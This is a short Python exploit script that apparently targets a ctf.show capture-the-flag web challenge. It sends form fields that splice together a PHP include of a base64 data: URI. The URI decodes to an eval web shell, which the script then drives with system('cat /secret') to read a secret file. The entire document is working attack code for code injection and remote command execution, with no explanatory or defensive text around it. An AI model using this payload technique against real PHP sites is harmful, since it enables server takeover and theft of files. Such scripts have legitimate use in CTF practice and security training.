import requests

url="http://ce01537e-72f8-4ac1-adc8-d034957ad28b.challenge.ctf.show/"

def flag():
    data={
        "num1": 'include "data:ctfshow',
        "symbol": "/",
        "num2": 'b;base64,PD9waHAgZXZhbCgkX0dFVFsxXSk7Pz4";'
    }
    response=requests.post(url=url+"?1=system('cat /secret');die();",data=data)
    print(response.text)

if __name__=='__main__':
    flag()
